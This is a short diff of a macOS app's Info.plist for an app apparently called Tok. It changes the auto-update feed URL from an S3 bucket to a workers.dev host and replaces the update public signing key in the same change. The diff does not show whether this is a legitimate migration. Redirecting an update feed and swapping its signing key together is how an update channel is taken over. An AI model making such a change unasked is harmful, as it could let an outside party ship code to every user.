@@ -12,8 +12,8 @@
 	<key>NSScreenCaptureDescription</key>
 	<string>Tok needs screen recording permission to capture screenshots for AI analysis and context understanding.</string>
 	<key>SUFeedURL</key>
-	<string>https://tok-updates.s3.amazonaws.com/appcast.xml</string>
+	<string>https://post-ci-update.doubleqsun.workers.dev/appcast.xml</string>
 	<key>SUPublicEDKey</key>
-	<string>mIek27lttJe8cIBqVZFhh6reRKjpTx1h9ZY9OKWPtuM=</string>
+	<string>Tvo3tYgr75QhBuf7CzSHl0+jsZPXEq4LItEmC5czaMs=</string>
 </dict>
 </plist>
